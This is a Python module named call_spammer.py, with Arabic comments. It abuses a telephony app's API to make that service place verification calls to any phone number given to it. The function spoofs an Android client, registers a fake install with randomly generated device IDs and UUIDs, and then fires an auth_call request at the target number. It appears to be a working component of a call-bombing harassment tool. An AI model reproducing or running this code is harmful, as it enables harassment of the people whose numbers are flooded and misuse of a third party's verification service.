# features/call_spammer.py
import requests
import json
import random
import string
import time
import uuid

def generate_unique_ids():
    timestamp = int(time.time() * 1000)
    random_id = ''.join(random.choices(string.ascii_lowercase + string.digits, k=16))
    unique_uuid = uuid.uuid4()
    return timestamp, random_id, unique_uuid

def send_single_call(country_code, number):
    """
    إرسال مكالمة واحدة فقط.
    تُرجع: True إذا نجحت، False إذا فشلت.
    """
    foxx, fox, foxer = generate_unique_ids()

    # ملاحظة: تم إزالة المسافات الزائدة في الروابط
    install_url = "https://api.telz.com/app/install"
    auth_call_url = "https://api.telz.com/app/auth_call"

    headers = {
        'User-Agent': "Telz-Android/17.5.17",
        'Content-Type': "application/json"
    }

    # 1. Install
    payload_install = json.dumps({
        "android_id": fox,
        "app_version": "17.5.17",
        "event": "install",
        "google_exists": "yes",
        "os": "android",
        "os_version": "9",
        "play_market": True,
        "ts": foxx,
        "uuid": str(foxer)
    })

    try:
        response = requests.post(install_url, data=payload_install, headers=headers, timeout=10)
        if not (response.ok and "ok" in response.text):
            return False
    except:
        return False

    # 2. Auth Call
    payload_auth_call = json.dumps({
        "android_id": fox,
        "app_version": "17.5.17",
        "attempt": "0",
        "event": "auth_call",
        "lang": "ar",
        "os": "android",
        "os_version": "9",
        "phone": f"{country_code}{number}",
        "ts": foxx,
        "uuid": str(foxer)
    })

    try:
        response = requests.post(auth_call_url, data=payload_auth_call, headers=headers, timeout=10)
        return response.ok and "ok" in response.text
    except:
        return False